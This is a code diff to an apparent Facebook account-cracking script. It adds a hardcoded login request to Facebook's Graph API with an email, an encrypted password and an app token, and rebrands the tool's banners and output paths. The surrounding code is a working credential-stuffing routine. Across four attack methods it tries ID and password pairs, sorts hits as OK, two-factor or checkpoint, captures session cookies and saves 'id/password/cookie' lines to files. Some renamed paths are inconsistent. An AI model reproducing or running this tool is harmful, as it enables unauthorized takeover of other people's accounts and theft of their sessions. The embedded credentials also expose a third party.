@@ -9,7 +9,29 @@ from time import localtime as lt
 from pip._vendor import requests
 from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import requests
+import json
 
+url = "https://graph.facebook.com/auth/login"
+
+payload = {
+  "locale": "ar_AR",
+  "format": "json",
+  "email": "turbo1dturbo1t@gmail.com",
+  "password": "#PWD_REACTNATIVE:2:1771158980:AUBP/yH+qv/s3YY5jscAAWXXPm8hXHF1LcK5Gvjj1nJJ4uAQIOtVWqfgENu6NkXH5YGZ5e/+6Q8nFbCRVy8+i+BkBpXC0P1df6+ry8OJku2GI2kMYsANlkGsmOYQ0xlvrtjLygiKZQCrwkpdRXkEzGaqgOxUolXoHpbOaK9lDX8E1LwokyuWWau/HBTXz+7sAHbKeAqbKFpNYbKh6ZzW8Aus5LgZtHjnT29CCLlGTOks63RH5Kqs0XnIb7Rp7VxTE14+LD3o6SWD1i7O8US6Gl6B6KC6TCDu0r8nBxIyYvJkYgldr8josGVGCPm+3GCG9u1W5lOMvKEf6LQJKMc3d6Dc3w3XEhjOvNvc3uM0s1Oj+sYVu/pm5C6EDwHHUUNbFOwd8qq1mx2f",
+  "access_token": "257637621624717|7e73d6961c0c8fab39f62afdfb77f96b",
+  "generate_session_cookies": 1
+}
+
+headers = {
+  'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 15; RMX5566 Build/AP3A.240617.008) [FBAN/ViewpointsForAndroid;FBAV/286.0.0.1.109;FBBV/768956344;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/realme;FBBD/realme;FBDV/RMX5566;FBSV/15;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1468};FB_FW/1;]",
+  'Accept-Encoding': "gzip",
+  'content-type': "application/json;charset=utf-8"
+}
+
+response = requests.post(url, data=json.dumps(payload), headers=headers)
+
+print(response.text)
 #----------------\<-COLOR->/----------------#
 G = "\033[1;92m"; W = "\x1b[38;5;15m"; B = "\033[1;34m"
 Y = "\x1b[38;5;226m"; A = "\x1b[38;5;123m"; R = "\33[1;91m"
@@ -144,9 +166,14 @@ __COUNTRYS__ = af['country'].upper()
 xlinex = (f"{G}━"*56)
 #----------------\<-LOGO->/----------------#
 logo = f"""
-{G}   ┏━┓┏━╸┏━┓   ╻ ╻╺┳┓  ●{W}  DEVELOPER {xpxx} NOOR{G}-{W}404
-{W}   ┗━┓┣╸ ┣━┫{G}╺━╸{W}┏╋┛ ┃┃{G}  ●{W}  STATUS    {xpxx} FREE
-{G}   ┗━┛┗━╸╹ ╹   ╹ ╹╺┻┛  ●{W}  VERSION   {xpxx} V{G}/{W}{version}
+{G}                        
+
+░▀█▀░▀█▀░█▀▀░█▀▀░█▀▄░░
+░░█░░░█░░█░█░█▀▀░█▀▄░░
+░░▀░░▀▀▀░▀▀▀░▀▀▀░▀░▀░░
+                                ●{W}  DEVELOPER {xpxx} NOOR{G}-{W}2026
+{W}                              {G}  ●{W}  STATUS    {xpxx} FREE
+{G}                                ●{W}  VERSION   {xpxx} V{G}/{W}{version}
 {xlinex}
 {W}         👑 MIND IT NOTHING IS IMPOSSIBLE 👑
 {xlinex}
@@ -200,7 +227,7 @@ class __SEAXNOOR__:
     #----------------\<-FILE-MENU->/----------------#
     def __FILEX__(self) -> None:
         __CLEAR__()
-        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}sdcard{G}/{W}SEA.txt {G}/{W}OR{G}/{W} SEA.txt ")
+        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}sdcard{G}/{W}zax.txt {G}/{W}OR{G}/{W} zaz.txt ")
         __LINE__()
         __fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
         try:
@@ -350,7 +377,7 @@ class __SEAXNOOR__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{G}<[{W}SEA{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M1{G}]>'
+                f'\r{xp}{W}-{G}<[{W}zaz{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M1{G}]>'
                 f'{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
             )
             sys.stdout.flush()
@@ -437,7 +464,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}zaz-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -445,7 +472,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SEA-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/zaz-XD/FILE/SEA-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M1 : {ids}|{pas}|{cookie}"
@@ -454,15 +481,15 @@ class __SEAXNOOR__:
 
                 if twf in str(po):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{Y}zaz-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/zaz-XD/FILE/zaz-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
 
                 if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{R}zaz-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/zaz-XD/FILE/zaz-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -485,7 +512,7 @@ class __SEAXNOOR__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{G}<[{W}SEA{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M2{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
+                f'\r{xp}{W}-{G}<[{W}zaz{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M2{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
             )
             sys.stdout.flush()
             fn = names.split(' ')[0]
@@ -567,7 +594,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}zaz-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -575,7 +602,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SEA-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/zaz-XD/FILE/zaz-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M2 : {ids}|{pas}|{cookie}"
@@ -583,14 +610,14 @@ class __SEAXNOOR__:
                     break
                 if twf in str(po):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{Y}zaz-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/zaz-XD/FILE/zaz-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error']['message']:
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{R}zaz-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/zaz-XD/FILE/zaz-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -613,7 +640,7 @@ class __SEAXNOOR__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{G}<[{W}SEA{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M3{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
+                f'\r{xp}{W}-{G}<[{W}zaz{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M3{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
             )
             sys.stdout.flush()
             fn = names.split(' ')[0]
@@ -691,7 +718,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}zaz-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -699,7 +726,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SEA-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/zax-XD/FILE/zaz-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M3 : {ids}|{pas}|{cookie}"
@@ -707,14 +734,14 @@ class __SEAXNOOR__:
                     break
                 if twf in str(po):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{Y}zaz-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/zaz-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error']['message']:
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{R}zax-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/zaz-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -736,7 +763,7 @@ class __SEAXNOOR__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{G}<[{W}SEA{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M4{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
+                f'\r{xp}{W}-{G}<[{W}zaz{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M4{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
             )
             sys.stdout.flush()
             fn = names.split(' ')[0]
@@ -806,7 +833,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}zaz-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -814,7 +841,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SEA-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/SEA-XD/FILE/zaz-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M4 : {ids}|{pas}|{cookie}"
@@ -823,13 +850,13 @@ class __SEAXNOOR__:
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M4-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/SEA-XD/FILE/zaz-M4-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error_msg']:
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M4-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/SEA-XD/FILE/zaz-M4-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
